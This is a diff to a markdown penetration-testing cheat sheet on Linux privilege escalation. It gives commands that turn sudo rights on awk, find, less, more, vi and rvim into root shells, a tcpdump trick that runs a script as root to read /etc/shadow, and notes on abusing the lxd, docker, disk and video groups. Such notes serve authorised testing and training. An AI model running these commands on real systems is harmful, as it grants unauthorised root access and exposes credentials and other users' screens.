@@ -196,30 +196,20 @@ find / -perm -g=s -type f 2>/dev/null
 
 If you have a limited shell that has access to some programs using `sudo` you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to `cp` you can overwrite `/etc/shadow` or `/etc/sudoers` with your own malicious file.
 
-`awk`
+##### awk
 
 ```
 awk 'BEGIN {system("/bin/bash")}'
 ```
 
-`bash`
-
-`cp`  
-Copy and overwrite /etc/shadow
-
-`find`
+##### find
 
 ```bash
 sudo find / -exec bash -i \;
-
 find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
 ```
 
-`ht`
-
-The text/binary-editor HT.
-
-`less`
+##### less
 
 From less you can go into vi, and then into a shell.
 
@@ -229,7 +219,7 @@ v
 :shell
 ```
 
-`more`
+##### more
 
 You need to run more on a file that is bigger than your screen.
 
@@ -238,19 +228,7 @@ sudo more /home/pelle/myfile
 !/bin/bash
 ```
 
-`mv`
-
-Overwrite `/etc/shadow` or `/etc/sudoers`
-
-`man`
-
-`nano`
-
-`nc`
-
-`nmap`
-
-`tcpdump`
+##### tcpdump
 
 ```
 echo $'id\ncat /etc/shadow' > /tmp/.test
@@ -258,15 +236,25 @@ chmod +x /tmp/.test
 sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
 ```
 
-`vi/vim`
+##### vi/vim
 
 ```
-sudo vi
 :shell
 
 :set shell=/bin/bash:shell    
 :!bash
 ```
+
+##### rvim
+
+```
+:diffpatch $(sh <&2 >&2) 
+
+:py import os
+:py os.system("/bin/bash")
+```
+
+[Vim Issue \#1543](https://github.com/vim/vim/issues/1543)
 
 [How I got root with sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)
 
@@ -280,19 +268,19 @@ When first enumerating a group, see what it can access and what special permissi
 find / -group groupname 2>/dev/null
 ```
 
-#### adm
+##### adm
 
 The admin group, adm, allows the user to view logs in `/var/log`.  Whilst this is not directly exploitable, it can be used to leak sensitive information, such as user actions, vulnerable applications and any potentially hidden cron-jobs.
 
-#### lxd
+##### lxd
 
 If a member of the lxd gorup, the user can use this to escalate to root, and potentially escape any containers it is a member of.
 
-#### docker
+##### docker
 
 If a member of the docker group, the user can use this to escalate to root, and potentially escape the container.
 
-#### disk
+##### disk
 
 The disk group gives the user full access to any block devices contained within `/dev/`.  Since `/dev/sda1` will in general be the global file-system, and the disk group will have full read-write privileges to this device:
 
@@ -300,23 +288,23 @@ The disk group gives the user full access to any block devices contained within 
 brw-rw---- 1 root disk 8, 1 Feb  5 13:38 /dev/sda1
 ```
 
-From this we can use debugfs to enumerate the entire disk with effectively root level privileges.  
+From this we can use debugfs to enumerate the entire disk with effectively root level privileges.
 
-#### video
+##### video
 
 The video group controls access to graphical output devices.  The output to screen is stored within the [framebuffer](https://www.kernel.org/doc/Documentation/fb/framebuffer.txt), which can be dumped to disk and converted to an image, using the following [script](https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/):
 
 ```perl
 #!/usr/bin/perl -w
- 
+
 $w = shift || 240;
 $h = shift || 320;
 $pixels = $w * $h;
- 
+
 open OUT, "|pnmtopng" or die "Can't pipe pnmtopng: $!\n";
- 
+
 printf OUT "P6%d %d\n255\n", $w, $h;
- 
+
 while ((read STDIN, $raw, 2) and $pixels--) {
    $short = unpack('S', $raw);
    print OUT pack("C3",
@@ -324,7 +312,7 @@ while ((read STDIN, $raw, 2) and $pixels--) {
       ($short & 0x7e0) >> 3,
       ($short & 0x1f) << 3);
 }
- 
+
 close OUT;
 ```
 
@@ -335,9 +323,7 @@ $height=cat /sys/class/graphics/fb0/virtual_size | cut -d, -f2
 ./raw2png $width $height < /tmp/fb0.raw > /tmp/fb0.png
 ```
 
-This isn't directly exploitable, but utilised correctly can allow you to view a user with physical access' session and potentially leak information this way.
-
-#### audio
+This isn't directly exploitable, but utilized correctly can allow you to view a user with physical access' session and potentially leak information this way.
 
 ### World writable scripts invoked as root
 
